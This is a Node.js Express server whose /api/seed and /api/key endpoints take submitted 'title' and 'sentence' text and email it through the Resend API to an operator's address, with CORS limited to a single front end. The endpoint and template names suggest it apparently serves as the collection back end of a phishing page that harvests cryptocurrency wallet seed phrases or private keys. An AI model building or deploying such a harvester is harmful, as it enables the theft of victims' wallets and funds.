const express = require("express");
const { Resend } = require("resend"); // Swapped Nodemailer for Resend
const ejs = require("ejs");
const path = require("path");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", 1);


app.use(helmet());

app.use(
  cors({
    origin: process.env.FRONT_URL,
    methods: ["POST"],
  }),
);

const emailLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15,
  message: { error: "Too many requests from this IP, please try again later." },
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(express.json({ limit: "10kb" }));

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));


const resend = new Resend(process.env.RESEND_API_KEY);

// Helper function using HTTP instead of raw SMTP ports
async function handleEmailRequest(req, res, templateName) {
  const { title, sentence } = req.body;

  if (
    !title ||
    !sentence ||
    typeof title !== "string" ||
    typeof sentence !== "string"
  ) {
    return res.status(400).json({ error: "Missing or invalid parameters." });
  }

  try {
    // We still use your beautiful EJS templates to compile down to plain HTML text!
    const html = await ejs.renderFile(
      path.join(__dirname, "views", `${templateName}.ejs`),
      { title, sentence },
    );

    // Sending via standard HTTPS web traffic (Port 443) - bypassed Render's firewall restrictions
    const { data, error } = await resend.emails.send({
      from: "onboarding@resend.dev", // Resend provides this default sandbox sender for testing
      to: process.env.CLIENT_EMAIL,
      subject: title,
      html: html,
    });

    if (error) {
      console.error("❌ Resend API Error:", error);
      return res
        .status(500)
        .json({ error: "Email service provider rejected request." });
    }

    return res
      .status(200)
      .json({
        success: true,
        message: `Email sent via ${templateName} over HTTP.`,
      });
  } catch (error) {
    console.error(`System Error inside ${templateName}:`, error);
    return res
      .status(500)
      .json({ error: "Failed to process email compilation." });
  }
}

// --- ENDPOINTS ---
app.post("/api/seed", emailLimiter, (req, res) => {
  handleEmailRequest(req, res, "sentence");
});

app.post("/api/key", emailLimiter, (req, res) => {
  console.log("Received request for /api/key");
  handleEmailRequest(req, res, "sentence");
});

app.get("/health", (req, res) => {
  res.status(200).send("OK");
});

app.listen(PORT, () => {
  console.log(`Server running safely on port ${PORT}`);
});
